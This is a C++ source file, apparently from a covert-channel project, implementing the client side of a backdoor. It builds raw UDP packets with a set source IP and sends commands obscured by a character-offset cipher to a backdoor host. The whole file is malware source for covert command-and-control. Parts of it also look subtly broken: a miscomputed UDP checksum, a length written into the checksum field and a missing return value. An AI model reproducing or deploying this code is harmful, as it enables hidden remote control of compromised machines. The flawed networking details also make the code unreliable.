/**
 * This is the covert socket. It is used to send data from the client to the backdoor.
 *
 * Author: Sean H
 * 
 */


#include <iostream>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <complex>
#include <unistd.h>
#include "CovertSocket.h"
#include "../utils/Logger.h"
#include "../utils/Structures.h"

CovertSocket::CovertSocket(std::string connectionIPAddress, std::string srcIP, int cypherOffset)
{
    this->connectionIPAddress = connectionIPAddress; //Set the IP address of the backdoor
    this->srcIP = srcIP; //Set the bind IP address
    this->cypherOffset = cypherOffset;
    this->rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
    int arg = 1;
    if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
    {
        Logger::error("Failed to set socket options in CoverSocket::CovertSocket");
    }
}

/**
 * This will take in a given command create a raw socket and send the command
 */
int CovertSocket::sendCommand(std::string command)
{
    Logger::debug("Sending command: " + command);

    char datagram[PKT_SIZE];
    struct iphdr *ip = (struct iphdr *) datagram;
    struct udphdr *udp = (struct udphdr *) (datagram + sizeof(*ip));
    char *query = (char *)(datagram + sizeof(*ip) + sizeof(*udp));
    std::string encryptedPayload;

    struct sockaddr_in sin;
    pseudo_header psh;

    for(unsigned int i = 0; i < command.length(); i++)
    {
        char c = command[i];
        encryptedPayload += (c + (this->cypherOffset));
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(this->srcPort); //Destination port
    sin.sin_addr.s_addr = inet_addr(this->connectionIPAddress.c_str()); //Destination IP address

    memset(datagram, 0, PKT_SIZE);

    //IP Header Fields
    ip->ihl = 5;        // IP Header Length
    ip->version = 4;        // Version 4
    ip->tos = 0;
    ip->tot_len = sizeof(struct ip) + sizeof(struct udphdr) + encryptedPayload.size() + sizeof(struct QUESTION);    // Calculate the total Datagram size
    ip->id = htonl(12345);    //IP Identification Field
    ip->frag_off = 0;
    ip->ttl = 255;        // Set the TTL value
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;        //Initialize to zero before calculating checksum
    ip->saddr = inet_addr (this->srcIP.c_str());  //Source IP address
    ip->daddr = sin.sin_addr.s_addr;

    ip->check = this->csum((unsigned short *) datagram, ip->tot_len >> 1);

    udp->dest = htons(this->dstPort); //Set destination port
    udp->source = htons(this->srcPort); //Set source port

    //udp->len = htons(sizeof(*udp) + data.size());
    //udp->uh_sum = htons(sizeof(*udp) + data.size());
    udp->uh_sum = htons(sizeof(*udp) + encryptedPayload.size() + sizeof(struct QUESTION));
    udp->len = htons(sizeof(*udp) + encryptedPayload.size() + sizeof(struct QUESTION));
    udp->check = 0;

    //Pseudo Header
    psh.dest_address = sin.sin_addr.s_addr;
    psh.source_address = inet_addr(this->srcIP.c_str());
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;

    memcpy(&psh.udp, udp, sizeof(struct udphdr));
    udp->check = csum((unsigned short *) &udp, sizeof(pseudo_header));

    strcpy(query, encryptedPayload.c_str());

    struct QUESTION *dnsq = (struct QUESTION *)(datagram + sizeof(*ip) + sizeof(*udp) + encryptedPayload.size());

    int one = 1;
    const int *val = &one;
    if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        Logger::error("Failed to set socket options in CovertSocket::sendCommand");
    }

    //Send the packet
    if (sendto (this->rawSocket, datagram, ip->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    {
        Logger::error("Failed to sendto() in CovertSocket::sendCommand");
    }
}

/**
 * This is the function implementation that calculates the checksum of a packet
 */
unsigned short CovertSocket::csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}
